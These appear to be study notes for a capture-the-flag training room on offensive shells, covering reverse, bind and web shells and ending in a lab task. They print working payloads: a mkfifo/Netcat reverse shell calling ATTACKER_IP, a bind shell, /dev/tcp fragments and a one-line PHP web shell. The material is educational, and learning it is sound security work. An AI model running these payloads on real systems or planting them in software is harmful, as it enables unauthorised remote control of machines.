# Shells Overview
## Intro
* **Overview:** Introduces shells in offensive security as essential mechanisms used by attackers to remotely control systems and form a critical component of the attack chain.
* **Learning Objectives:**
    * Understand shells in offensive security.
    * Set up and use reverse and bind shells.
    * Deploy web shells.
* **Prerequisites:** Recommends a foundational understanding of networking, web application security, basic command-line proficiency, and familiarity with scripting languages like Bash, Python, or PHP.
* **Key Caveats:**
    * The room intentionally excludes Metasploit or automated framework generators to focus entirely on manual understanding of how shells work under the hood.
    * All provided examples and demonstrations use Linux as the operating system.

## Shells Overview
* **Overview:** Defines what a shell is in computing and explores its primary role in offensive cybersecurity as a remote session that allows an attacker to interact with a compromised operating system.
* **Key Post-Exploitation Activities Enabled by Shells:**
    * **Remote System Control:** Executing commands and software remotely on the target system.
    * **Privilege Escalation:** Elevating restricted initial access to administrative or root privileges.
    * **Data Exfiltration:** Reading, locating, and copying sensitive data from the system.
    * **Persistence and Maintenance Access:** Creating backdoor accounts, scheduling tasks, or leaving credentials to maintain long-term access.
    * **Post-Exploitation Activities:** Deploying malware, clearing logs, or hiding information.
    * **Pivoting (Network Hopping):** Using the compromised system as a launching pad to attack other internal networks or machines.

## Reverse Shell
* Overview: Explores reverse shells (also known as "connect-back shells"), where the target system initiates a network connection back to the attacker's machine, helping bypass incoming firewall restrictions and security rules.
* **Setting Up a Listener**:
    * The attacker starts by setting up a listener using Netcat on their machine: `nc -lvnp 443`
    * Flag breakdown: `-l` listens for connections, `-v` enables verbose mode, `-n` prevents DNS lookups (uses IP addresses directly), and `-p` specifies the listening port. Attackers often use standard web or service ports (like 53, 80, 443, or 445) to blend in with normal traffic.
* **Executing the Payload**:
    * Once the listener is active, a payload is executed on the compromised target to spawn and pipe a shell back to the attacker's IP and port.
    * A common example is the pipe reverse shell: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`, which creates a named FIFO pipe (`/tmp/f`) to facilitate two-way interactive command execution and output redirection.
* **Receiving Access**:
    * The attacker's listener catches the incoming connection from the target machine's IP, instantly dropping them into an interactive shell session.

## Bind Shell
* **Overview:** Explores bind shells, where the compromised target system binds a network port and listens for incoming connections, exposing a command shell to anyone who connects to it.
* **Use Cases & Limitations**: Bind shells are typically used when the target environment blocks outgoing connections (preventing a standard reverse shell). However, they are less common and stealthy because the target must continuously run a listening service open to the network, which increases the likelihood of detection by firewalls and security tools.
* **Setting Up a Bind Shell on the Target**:
    * The attacker (or the payload executing on the target) binds a port and pipes a shell instance using a command like: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`
    * **Note**: Ports below 1024 require elevated root/privileged permissions to listen on, which is why ports like 8080 are commonly used in practice.
* **Connecting to the Bind Shell**:
    * The attacker connects directly to the listening port on the target machine using Netcat: `nc -nv TARGET_IP 8080`
    * Once connected, the attacker is instantly presented with an interactive command-line session on the target system.

## Shell Listeners
* **Overview:** Explores advanced utilities beyond standard Netcat that can be used to set up listeners, handle incoming shells, and enhance interactivity.
* **Rlwrap (Readline Wrapper):** A small utility that wraps around programs like Netcat to add GNU readline features, allowing you to use command history, arrow keys for navigation, and line editing in reverse shells.
* **Ncat:** An improved, modern version of Netcat distributed by the Nmap project. It includes extra capabilities, most notably built-in support for encrypted SSL connections (`--ssl`).
* **Socat:** A powerful, highly flexible networking utility that allows you to create a socket connection between two independent data sources (such as mapping a network listener directly to standard input/output).

## Shell Payloads
* **Overview:** Explores common shell payloads across various scripting and programming languages used in Linux environments to generate reverse shells.
* **Bash Payloads:** Utilizes built-in network device files (like `/dev/tcp/ATTACKER_IP/443`) combined with interactive shell flags (`bash -i`), custom file descriptors, or pipe redirections to funnel input, output, and error streams back to the attacker's listener.
* **PHP Payloads:** Leverages core execution functions such as `fsockopen()` to establish the socket connection, paired with command execution functions like `exec()`, `shell_exec()`, `system()`, `passthru()`, or `popen()` to route a shell (`sh <&3 >&3 2>&3`) through the TCP socket.
* **Python Payloads:** Uses the Python socket library to connect back to the attacker and `os.dup2()` to duplicate socket file descriptors across standard input, output, and error channels (0, 1, 2), often wrapping an interactive shell with `pty.spawn("bash")`. Payloads can also leverage environment variables (`os.getenv`) or the subprocess module.
* **Alternative Languages & Utilities:** Demonstrates alternative techniques including Netcat combined with BusyBox (`-e sh`), AWK built-in TCP networking capabilities (`/inet/tcp/...`), and named pipes (`mkfifo`) paired with Telnet.

## Web Shell
* **Overview:** Explores web shells, which are scripts written in server-side languages (like PHP, ASP, or JSP) and hosted on a compromised web server to execute system commands directly through web requests.
* **How They Work:**
    * A simple PHP web shell looks like this: `<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>`
    * Once uploaded via vulnerabilities such as Unrestricted File Upload, File Inclusion, or Command Injection, the attacker appends the command as a GET parameter in the URL (e.g., `http://victim.com/uploads/shell.php?cmd=whoami`).
    * The web server executes the command and renders the output directly in the browser.
* **Popular Open-Source Web Shells:**
    * **p0wny-shell:** A minimalistic single-file PHP shell with a terminal-like GUI.
    * **b374k shell:** A feature-rich shell that includes built-in file management and command execution tools.
    * **c99 shell:** A well-known, robust classic web shell with extensive post-exploitation functionalities.

## Practical Task
* **Overview:** Provides a hands-on practical challenge to apply the concepts learned throughout the room by exploiting a lab machine containing two vulnerable web applications.
* **Lab Infrastructure:**
    * `10.49.178.183:8080`: Hosts the main landing page.
    * `10.49.178.183:8081`: Hosts a web application vulnerable to Command Injection.
    * `10.49.178.183:8082`: Hosts a web application vulnerable to Unrestricted File Upload.
* **Practical Objectives:**
    * **Command Injection Challenge:** Use a reverse or bind shell payload against the application on port 8081 to gain shell access and retrieve the flag located in the root `/` directory (formatted as `THM{...}`).
    * **Web Shell Challenge:** Craft and upload a web shell (or payload) against the application on port 8082 bypassing file restrictions, execute it to obtain a shell, and retrieve the second flag saved in the root `/` directory.